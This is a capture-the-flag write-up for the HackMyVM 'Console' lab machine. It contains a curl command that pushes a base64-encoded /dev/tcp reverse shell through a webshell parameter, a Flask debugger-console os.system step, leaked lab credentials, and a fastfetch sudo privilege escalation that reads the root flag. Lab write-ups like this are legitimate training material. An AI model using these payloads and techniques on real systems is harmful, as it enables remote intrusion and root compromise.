# Console: HackMyVM
Difficulty: Medium

## Enumeration
On running an nmap scan, we get port 22, 80 and 5000 open, though 5000 doesnt appear to be accessible.

Nmap Scan Results:

```
# Nmap 7.95 scan initiated Wed Aug  6 19:19:15 2025 as: /usr/lib/nmap/nmap -sC -sV -A -p- -o nmap.txt 192.168.0.110
Nmap scan report for 192.168.0.110
Host is up (0.0025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open     http     Apache httpd 2.4.62 ((Debian))
|_http-title: Console \xC2\xB7 \xE9\xBB\x91\xE5\xAE\xA2\xE7\x9A\x84\xE7\xAA\x97\xE5\x8F\xA3
|_http-server-header: Apache/2.4.62 (Debian)
443/tcp  open     ssl/http Apache httpd 2.4.62
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.62 (Debian)
| ssl-cert: Subject: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec/stateOrProvinceName=Beijing/countryName=CN
| Not valid before: 2025-05-17T09:19:35
|_Not valid after:  2035-05-15T09:19:35
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
5000/tcp filtered upnp
MAC Address: 08:00:27:98:BA:A6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: hacker.maze-sec.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.52 ms 192.168.0.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  6 19:19:37 2025 -- 1 IP address (1 host up) scanned in 22.47 seconds
```

So from this scan, we can see the subdomain `hacker.maze-sec.hmv`, so I added both `maze-sec.hmv` and `hacker.maze-sec.hmv` to the hosts file.

Both of these sites contain basically nothing at first glance. And I was stuck here for most of the time. So I decided to check the source code of the websites.

In `hacker.maze-sec.hmv` there is a hacker.js JavaScript file that can be found in the source code. There is this snippet in the code:
```javascript
let path = ['su', 'per', 'co', 'ool'].join('') + '.php';
let param = ['cm', 'd='].join('');
```

So through this we can send a reverse shell payload. Now for whatever reason, you can't send a payload to practically any port except port 443. So any reverse shell payload to port 443 works. I used this one:

1. base64 encode `sh -i >& /dev/tcp/192.168.0.111/443 0>&1` (replace the IP with your IP)

```bash
curl https://hacker.maze-sec.hmv/supercoool.php?cmd=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4wLjExMS80NDMgMD4mMQo=+|base64+-d+|+bash
```

This will gain you a shell on your listener, from where you can read the flag in `/home/welcome`.

Read the .viminfo file of the welcome user to gain the password to the user.

Credentials: `welcome:welcome123`

## Pivoting

Running `sudo -l` on the user welcome gives us this:
```
Matching Defaults entries for welcome on Console:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Console:
    (qaq) PASSWD: /bin/cat /opt/flask-app/logs/flask.log
```

And on running the command `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` we get this output (or something similar lol):
```
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.0.110:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 258-005-805
127.0.0.1 - - [06/Aug/2025 11:16:23] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [06/Aug/2025 11:16:40] "GET /console HTTP/1.1" 200 -
127.0.0.1 - - [06/Aug/2025 11:17:46] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [06/Aug/2025 11:17:46] "GET /favicon.ico HTTP/1.1" 404 -
```

Since the development server here is running in debug mode, we can use the python console to execute commands as user qaq!

So first login to the welcome user via SSH and port forward 5000 like this:

```bash
ssh -L 5000:127.0.0.1:5000 welcome@maze-sec.hmv
```

Now re-run `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` to regenerate the debugger PIN. 

In your browser, go to "http://127.0.0.1:5000/console", and enter the Debugger PIN that is shown in the output of the previous command. This allows us to access the console.

To get a reverse shell you can just use our old payload (again idk why it connects only through port 443). So the command you send would look something like this:
```python
import os

os.system("<old payload>")
```

Keep a netcat listener running and you should see the shell spawn for user qaq. Stabilize the shell however you see fit.

## Privilege Escalation

This was the fun part. On running `sudo -l` you can see this.

```
Matching Defaults entries for qaq on Console:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qaq may run the following commands on Console:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

So how can we exploit fastfetch to run shell commands? This took me quite a while to figure out, then I saw this [reddit post](https://www.reddit.com/r/GarudaLinux/comments/1dcq0dl/making_fastfetch_more_beautiful_linux/). In this post it was this snippet that really interested me:

```json
{
    "type": "command",
    "key": "  OS Age ",
    "keyColor": "magenta",
    "text": "birth_install=$(stat -c %W /); current=$(date +%s); time_progression=$((current - birth_install)); days_difference=$((time_progression / 86400)); echo $days_difference days"
},
```

So I just replaced all of this in the `text` parameter with the actual command I want to execute. Is there a simpler way to do this? Yes. But, I couldnt get any other config to work on my end so I just used this one.

Here are the steps to gain the root flag.

1. Run `/usr/bin/fastfetch --gen-config`
2. In the generated config file (usually this one `/home/qaq/fastfetch/config.jsonc`) paste in this configuration

```json
{
    "$schema": "https://github.com/fastfetch-cli/fastfetch/raw/dev/doc/json_schema.json",
    "logo": {
        "type": "builtin",
        "height": 15,
        "width": 30,
        "padding": {
            "top": 5,
            "left": 3
        }
    },
    "modules": [
        "break",
        {
            "type": "custom",
            "format": "\u001b[90m┌──────────────────────Hardware──────────────────────┐"
        },
        {
            "type": "host",
            "key": " PC",
            "keyColor": "green"
        },
        {
            "type": "cpu",
            "key": "│ ├",
            "keyColor": "green"
        },
        {
            "type": "gpu",
            "key": "│ ├󰍛",
            "keyColor": "green"
        },
        {
            "type": "memory",
            "key": "│ ├󰍛",
            "keyColor": "green"
        },
        {
            "type": "disk",
            "key": "└ └",
            "keyColor": "green"
        },
        {
            "type": "custom",
            "format": "\u001b[90m└────────────────────────────────────────────────────┘"
        },
        "break",
        {
            "type": "custom",
            "format": "\u001b[90m┌──────────────────────Software──────────────────────┐"
        },
        {
            "type": "os",
            "key": " OS",
            "keyColor": "yellow"
        },
        {
            "type": "kernel",
            "key": "│ ├",
            "keyColor": "yellow"
        },
        {
            "type": "bios",
            "key": "│ ├",
            "keyColor": "yellow"
        },
        {
            "type": "packages",
            "key": "│ ├󰏖",
            "keyColor": "yellow"
        },
        {
            "type": "shell",
            "key": "└ └",
            "keyColor": "yellow"
        },
        "break",
        {
            "type": "de",
            "key": " DE",
            "keyColor": "blue"
        },
        {
            "type": "lm",
            "key": "│ ├",
            "keyColor": "blue"
        },
        {
            "type": "wm",
            "key": "│ ├",
            "keyColor": "blue"
        },
        {
            "type": "wmtheme",
            "key": "│ ├󰉼",
            "keyColor": "blue"
        },
        {
            "type": "terminal",
            "key": "└ └",
            "keyColor": "blue"
        },
        {
            "type": "custom",
            "format": "\u001b[90m└────────────────────────────────────────────────────┘"
        },
        "break",
        {
            "type": "custom",
            "format": "\u001b[90m┌────────────────────Uptime / Age / DT────────────────────┐"
        },
        {
            "type": "command",
            "key": "  OS Age ",
            "keyColor": "magenta",
            "text": "cat /root/r00t.txt"
        },
        {
            "type": "uptime",
            "key": "  Uptime ",
            "keyColor": "magenta"
        },
        {
            "type": "datetime",
            "key": "  DateTime ",
            "keyColor": "magenta"
        },
        {
            "type": "custom",
            "format": "\u001b[90m└─────────────────────────────────────────────────────────┘"
        },

//        {
//            "type": "colors"
//        },

        {
            "type": "colors",
            "paddingLeft": 2,
            "symbol": "circle"
        }
 
    ]
}
```

This is just the config from reddit, modified with the shell command.

3. Now run `sudo /usr/bin/fastfetch --config /home/qaq/fastfetch/config.jsonc`

This will show you the root flag in the `OS Age:` section.

That's it, enjoy pwning :)
